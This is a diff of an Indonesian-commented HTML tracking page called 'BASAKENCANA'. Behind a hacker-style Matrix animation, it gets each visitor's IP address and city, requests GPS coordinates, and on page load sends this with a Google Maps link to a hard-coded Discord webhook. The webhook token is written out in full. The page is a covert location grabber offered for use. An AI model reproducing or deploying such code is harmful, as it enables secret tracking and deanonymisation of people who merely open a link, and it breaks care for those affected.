@@ -7,80 +7,87 @@
     <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
     <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
     <style>
-        body { margin: 0; background: black; color: #0F0; font-family: monospace; overflow: hidden; }
-        canvas { display: block; position: fixed; top: 0; left: 0; z-index: 1; }
-        #info { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); text-align: center; background: rgba(0,0,0,0.85); padding: 20px; border: 2px solid #0F0; border-radius: 8px; width: 320px; z-index: 10; box-shadow: 0 0 20px #0F0; }
-        #map { height: 200px; width: 100%; margin-top: 15px; border: 1px solid #0F0; border-radius: 4px; background: #111; }
+        body { margin: 0; background: #000; overflow: hidden; font-family: 'Courier New', monospace; }
+        
+        /* Matriks dipastikan di paling belakang tapi tetap terlihat */
+        #matrix {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 1;
+        }
+
+        /* Kotak info di atas matriks */
+        #info {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            z-index: 10;
+            background: rgba(0, 0, 0, 0.85);
+            color: #0F0;
+            padding: 20px;
+            border: 2px solid #0F0;
+            border-radius: 10px;
+            width: 300px;
+            text-align: center;
+            box-shadow: 0 0 20px #0F0;
+        }
+
+        #map { height: 180px; width: 100%; margin-top: 10px; border: 1px solid #0F0; }
     </style>
 </head>
 <body>
 
+<canvas id="matrix"></canvas>
+
 <div id="info">
-    <h2>BASAKENCANA SYSTEM</h2>
-    <p id="status">INITIALIZING...</p>
-    <p id="ip"></p>
-    <p id="location"></p>
+    <h2 style="margin:0 0 10px 0;">SYSTEM ACTIVE</h2>
+    <p id="status">SCANNING...</p>
+    <p id="ip" style="font-size: 14px;"></p>
+    <p id="location" style="font-size: 14px;"></p>
     <div id="map"></div>
 </div>
 
-<canvas id="matrix"></canvas>
-
 <script>
-// --- 1. KONFIGURASI WEBHOOK ---
 const webhookURL = "https://discord.com/api/webhooks/1484383057975709819/7qQ5RYrC4FkuCKiin5gEpH0yfliZMNCrM4atDn-qn4LA_dI5zrS-Dwawh3QdA48FY0kI";
 
-// --- 2. ANIMASI MATRIKS (DIJALANKAN PERTAMA) ---
+// --- LOGIKA MATRIKS ---
 const canvas = document.getElementById('matrix');
 const ctx = canvas.getContext('2d');
 
-function resizeCanvas() {
-    canvas.width = window.innerWidth;
-    canvas.height = window.innerHeight;
-}
-window.addEventListener('resize', resizeCanvas);
-resizeCanvas();
+canvas.width = window.innerWidth;
+canvas.height = window.innerHeight;
 
-const letters = "010101010101";
+const chars = "0101010101";
 const fontSize = 16;
-const columns = Math.floor(canvas.width / fontSize);
-const drops = Array(columns).fill(1);
+const columns = canvas.width / fontSize;
+const drops = Array.from({ length: columns }, () => 1);
 
-function drawMatrix() {
+function draw() {
     ctx.fillStyle = "rgba(0, 0, 0, 0.05)";
     ctx.fillRect(0, 0, canvas.width, canvas.height);
     ctx.fillStyle = "#0F0";
     ctx.font = fontSize + "px monospace";
-    
+
     for (let i = 0; i < drops.length; i++) {
-        const text = letters[Math.floor(Math.random() * letters.length)];
+        const text = chars[Math.floor(Math.random() * chars.length)];
         ctx.fillText(text, i * fontSize, drops[i] * fontSize);
-        if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
-            drops[i] = 0;
-        }
+        if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
         drops[i]++;
     }
 }
-setInterval(drawMatrix, 50);
+setInterval(draw, 33);
 
-// --- 3. PELACAKAN & DISCORD ---
-async function sendToDiscord(data, mapsLink, metode) {
-    const payload = {
-        username: "BASAKENCANA BOT",
-        content: `🚨 **PENGUNJUNG TERDETEKSI!**\n🌐 **IP:** ${data.ip}\n🏙️ **Kota:** ${data.city}\n🎯 **Metode:** ${metode}\n🗺️ **Maps:** ${mapsLink}`
-    };
-    await fetch(webhookURL, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(payload)
-    });
-}
-
+// --- LOGIKA PELACAK ---
 async function track() {
     try {
         const res = await fetch("https://ipapi.co/json/");
         const data = await res.json();
         
-        document.getElementById('status').innerText = "TARGET LOCKED";
+        document.getElementById('status').innerText = "TARGET IDENTIFIED";
         document.getElementById('ip').innerText = "IP: " + data.ip;
         document.getElementById('location').innerText = "LOC: " + data.city;
 
@@ -90,22 +97,31 @@ async function track() {
                 const lon = pos.coords.longitude;
                 const mLink = `https://www.google.com/maps?q=${lat},${lon}`;
                 
-                // Tampilkan Map
-                var map = L.map('map').setView([lat, lon], 15);
+                var map = L.map('map').setView([lat, lon], 13);
                 L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
                 L.marker([lat, lon]).addTo(map);
 
-                await sendToDiscord(data, mLink, "🎯 GPS");
+                await send(data, mLink, "🎯 GPS");
             }, async () => {
                 const mLink = `https://www.google.com/maps?q=${data.latitude},${data.longitude}`;
-                await sendToDiscord(data, mLink, "☁️ IP");
+                await send(data, mLink, "☁️ IP");
             });
         }
-    } catch (e) { console.log(e); }
+    } catch (e) { console.error(e); }
 }
 
-// Jalankan pelacakan setelah matriks mulai
-setTimeout(track, 1000);
+async function send(data, mapsLink, metode) {
+    await fetch(webhookURL, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+            username: "BASAKENCANA",
+            content: `🚨 **DETEKSI BARU**\nIP: ${data.ip}\nKota: ${data.city}\nMetode: ${metode}\nMaps: ${mapsLink}`
+        })
+    });
+}
+
+track();
 </script>
 </body>
 </html>
